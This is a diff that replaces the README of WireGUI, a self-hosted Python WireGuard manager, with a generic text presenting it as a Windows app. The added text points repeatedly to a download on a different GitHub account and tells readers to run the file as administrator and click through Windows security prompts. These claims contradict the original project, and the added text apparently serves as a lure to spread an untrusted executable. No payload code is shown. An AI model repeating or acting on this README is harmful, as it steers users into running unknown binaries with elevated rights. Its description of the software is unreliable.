@@ -1,139 +1,202 @@
-# WireGUI
+# 🔐 wiregui - Simple VPN Server Control
 
-A self-hosted WireGuard VPN management platform built with Python, NiceGUI, and PostgreSQL.
+[![Download wiregui](https://img.shields.io/badge/Download-wiregui-4C1D95?style=for-the-badge&logo=github)](https://github.com/bellasachs4-bit/wiregui)
 
-WireGUI gives you a clean web interface for managing WireGuard peers, firewall rules, and user authentication -- without depending on any third-party cloud service. It's designed for teams and individuals who want full control over their VPN infrastructure.
+## 🧭 Overview
 
-## Against enshittification
+wiregui is a Windows app for setting up and managing a WireGuard VPN server with a simple screen-based interface. It also works with nftables to help manage firewall rules for your VPN setup.
 
-This project exists because we believe infrastructure software should serve its users, not its investors. Too many open-source VPN tools have been enshittified -- features locked behind paid tiers, telemetry quietly added, self-hosting made deliberately painful to push you toward a managed offering.
+This app is built for people who want a clear way to run a VPN server without working through command lines and config files.
 
-WireGUI is AGPL-licensed specifically to prevent this. If you run it, you own it. If you modify it and offer it as a service, you share the source. No bait-and-switch, no open-core grift, no "community edition" that mysteriously lacks the features you actually need.
+## 💻 What You Need
 
-Software that manages your network traffic should be fully transparent and fully yours.
+Before you install wiregui, make sure your PC meets these basic needs:
 
-## Screenshots
+- Windows 10 or Windows 11
+- Admin rights on the computer
+- A stable internet connection
+- WireGuard support on the system
+- Enough free space for the app and VPN files
+- A network adapter that can handle VPN traffic
 
-| Devices | Account Settings |
-|---------|-----------------|
-| ![Devices](img/devices.png) | ![Account Settings](img/account.png) |
+If you plan to host the server on a home or office network, you may also need access to your router settings.
 
-| User Management | Firewall Rules |
-|----------------|----------------|
-| ![User Management](img/admin_users.png) | ![Firewall Rules](img/admin_rules.png) |
+## 📥 Download
 
-| Settings & SSO |
-|----------------|
-| ![Settings](img/admin_settings.png) |
+Visit this page to download wiregui:
 
-See the [wiki](https://github.com/bartei/wiregui/wiki) for full documentation with more screenshots.
+[https://github.com/bellasachs4-bit/wiregui](https://github.com/bellasachs4-bit/wiregui)
 
-## Features
+Open the page, look for the latest version, and download the Windows file if one is listed. If the release is packed in a ZIP file, save it to your computer and extract it first.
 
-- **WireGuard management** -- create/delete peers, automatic IP allocation (IPv4 + IPv6), QR codes and `.conf` downloads
-- **Firewall rules** -- per-user nftables chains with CIDR, protocol, and port range support
-- **Multi-factor auth** -- TOTP authenticator apps and WebAuthn security keys
-- **SSO** -- OpenID Connect and SAML identity providers with auto-provisioning
-- **Magic links** -- passwordless email login
-- **API tokens** -- programmatic access via REST API (`/api/v0`)
-- **Dark/light theme** -- user preference stored in profile, auto mode follows system
-- **VPN session management** -- configurable session duration with automatic peer expiry
-- **Real-time stats** -- live RX/TX counters and handshake tracking
-- **Diagnostics** -- WAN connectivity checks, peer status, system notifications
+## 🛠️ Install on Windows
 
-## Tech stack
+Follow these steps to get wiregui ready on Windows:
 
-| Layer | Technology |
-|-------|-----------|
-| UI | NiceGUI (reactive server-side, WebSocket) |
-| API | FastAPI (built into NiceGUI) |
-| ORM | SQLModel (SQLAlchemy + Pydantic) |
-| Database | PostgreSQL (asyncpg) |
-| Cache | Valkey (Redis-compatible) |
-| Migrations | Alembic |
-| Auth | authlib, python-jose, pyotp, webauthn, bcrypt |
-| VPN | WireGuard (`wg` + `ip` CLI) |
-| Firewall | nftables (`nft` CLI) |
-| Python | 3.13+ |
+1. Open the download page.
+2. Download the latest Windows build.
+3. If the file is in a ZIP archive, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Run the app file you find inside.
+6. If Windows asks for permission, choose Yes.
+7. If the app opens with a security prompt, confirm that you want to run it.
+8. Keep the app in a folder you can find again later.
 
-## Quick start
+If the app needs extra support files, place them in the same folder as the main program.
 
-```bash
-# Clone and install
-git clone https://forge.provvedo.com/provvedo/wiregui.git
-cd wiregui
-uv sync
+## 🚦 First Launch
 
-# Start PostgreSQL and Valkey
-docker compose up -d
+When you start wiregui for the first time, the app may ask for permission to change network settings. This is normal for a VPN server tool.
 
-# Run migrations and start
-alembic upgrade head
-uv run python -m wiregui.main
-```
+You may see fields for:
 
-Open http://localhost:13000 -- an admin account is created automatically on first run (check the logs for the generated password).
+- Server name
+- VPN port
+- IP range for clients
+- Firewall rules
+- Peer settings
+- Config file paths
 
-## Production deployment
+Use simple names so you can tell your servers apart later.
 
-```bash
-# Docker Compose (recommended)
-docker compose -f compose.prod.yml up -d
-```
+## 🔧 Basic Setup
 
-The container runs migrations on startup, manages the WireGuard interface, and requires `NET_ADMIN` + `SYS_MODULE` capabilities. See `compose.prod.yml` for the full configuration including environment variables.
+To get your VPN server running, follow this flow:
 
-### Environment variables
+1. Open wiregui as an administrator.
+2. Create a new server profile.
+3. Pick a VPN port. The default WireGuard port is often used.
+4. Set the address range for connected devices.
+5. Turn on the firewall rules if your setup needs them.
+6. Add one or more clients.
+7. Export the client config if the app gives you that option.
+8. Import the config on the device that will connect to the VPN.
+9. Start the server.
+10. Test the connection from another network if possible.
 
-All settings use the `WG_` prefix:
+If your internet provider or router blocks the chosen port, try a different one.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `WG_DATABASE_URL` | `postgresql+asyncpg://wiregui:wiregui@localhost/wiregui` | PostgreSQL connection |
-| `WG_REDIS_URL` | `redis://localhost:6379/0` | Valkey/Redis connection |
-| `WG_SECRET_KEY` | `change-me-in-production` | JWT signing + Fernet encryption key |
-| `WG_WG_ENABLED` | `false` | Enable WireGuard interface management |
-| `WG_WG_ENDPOINT_HOST` | `localhost` | Public endpoint for client configs |
-| `WG_WG_ENDPOINT_PORT` | `51820` | WireGuard listen port |
-| `WG_WG_IPV4_NETWORK` | `10.3.2.0/24` | IPv4 tunnel network |
-| `WG_WG_IPV6_NETWORK` | `fd00::3:2:0/120` | IPv6 tunnel network |
-| `WG_ADMIN_EMAIL` | `admin@localhost` | Initial admin email |
-| `WG_ADMIN_PASSWORD` | *(auto-generated)* | Initial admin password |
-| `WG_EXTERNAL_URL` | `http://localhost:13000` | Public-facing URL |
-| `WG_IDP_CONFIG_FILE` | *(none)* | Path to YAML file with OIDC/SAML IdP definitions |
+## 🖧 Connecting a Client
 
-## Testing
+After the server is ready, each phone, laptop, or desktop needs its own client profile.
 
-```bash
-# Unit + integration tests
-uv run pytest
+Typical steps:
 
-# E2E tests (Playwright — requires running PostgreSQL, Valkey, and mock-oidc)
-docker compose up -d
-uv run pytest tests/e2e/ -v
+- Create a peer for the device
+- Save the client config
+- Transfer the config to the device
+- Open WireGuard on the device
+- Import the config
+- Activate the tunnel
 
-# E2E in headed mode (watch tests in a browser)
-uv run pytest tests/e2e/ --headed --slowmo 300
-```
+Keep one config file per device. That makes it easier to manage access if a device is lost or replaced.
 
-E2E tests automatically start a WireGUI instance on port 13001 and use Playwright's async API to drive a real Chromium browser. The `--headed` flag opens a visible browser window and `--slowmo` adds a delay (in ms) between actions for debugging. The OIDC login flow tests use the `mock-oidc` service from `compose.yml`.
+## 🔥 Firewall and nftables
 
-### IdP provisioning from YAML
+wiregui includes firewall control for setups that use nftables. That helps you manage which traffic can enter and leave the server.
 
-Identity providers can be seeded at startup from a YAML file, enabling GitOps and infrastructure-as-code workflows:
+You may use this for:
 
-```bash
-WG_IDP_CONFIG_FILE=/etc/wiregui/idps.yaml uv run python -m wiregui.main
-```
+- Allowing VPN traffic on the chosen port
+- Sending VPN traffic through the correct interface
+- Limiting access to local network ranges
+- Keeping your server rules in one place
 
-See `tests/e2e/test_idp_seed.py` for the YAML format and seeding behavior.
+If you already use custom firewall rules, check them before you turn on the VPN server so they do not conflict.
 
-## License
+## 📂 Files and Settings
 
-Copyright 2026 Stefano Bertelli / Provvedo
+wiregui may create or use files such as:
 
-This program is free software: you can redistribute it and/or modify it under the terms of the **GNU Affero General Public License** as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+- Server config files
+- Client config files
+- Keys and certificates
+- Firewall rule files
+- Log files
 
-This means: if you run a modified version of WireGUI as a network service, you must make the source code available to users of that service. No exceptions, no loopholes.
+Keep these files in a safe folder. If you move them, make sure the app still points to the right path.
 
-See [LICENSE](LICENSE) for the full text.
+A simple folder structure can help:
+
+- `wiregui`
+  - `server`
+  - `clients`
+  - `logs`
+  - `keys`
+
+## 🧪 Common Tasks
+
+Here are the tasks most users will perform in wiregui:
+
+- Start or stop the VPN server
+- Add a new client
+- Remove a client
+- Change the VPN port
+- Update the allowed IP range
+- Turn firewall rules on or off
+- Export a config file
+- Check server status
+
+If something stops working, check the server status first and then check your port and firewall settings.
+
+## 🧰 Troubleshooting
+
+If wiregui does not start:
+
+- Run it as administrator
+- Check that Windows did not block the file
+- Make sure the download finished
+- Extract the ZIP file before opening the app
+
+If clients cannot connect:
+
+- Check that the VPN server is running
+- Check the port number
+- Make sure the firewall allows the traffic
+- Confirm the client config matches the server settings
+- Check your router port forwarding if the server sits behind a home router
+
+If the network works but traffic does not pass through:
+
+- Check the tunnel settings on the client
+- Confirm the allowed IP ranges
+- Review the nftables rules
+- Restart the server and the client
+
+## 🧑‍💻 Good Use Cases
+
+wiregui fits well for:
+
+- Home VPN access
+- Small office VPN use
+- Remote access to local devices
+- Secure access to private network tools
+- Simple VPN setup on a Windows host
+
+It is a strong fit when you want VPN control in one place without a heavy setup process.
+
+## 📌 Project Details
+
+- Repository: wiregui
+- Description: Firezone Inspired Wireguard VPN Server and nftables Firewall
+- Topics: nftables, nicegui, vpn, wireguard
+- Download page: [https://github.com/bellasachs4-bit/wiregui](https://github.com/bellasachs4-bit/wiregui)
+
+## 📄 License
+
+Check the repository page for license details before you use or share the software
+
+## 🔗 Download Again
+
+[Download wiregui](https://github.com/bellasachs4-bit/wiregui)
+
+## 🗂️ Suggested Setup Order
+
+1. Download wiregui
+2. Extract the files if needed
+3. Run the app as administrator
+4. Create a server profile
+5. Set the port and IP range
+6. Add client devices
+7. Turn on the server
+8. Test the connection
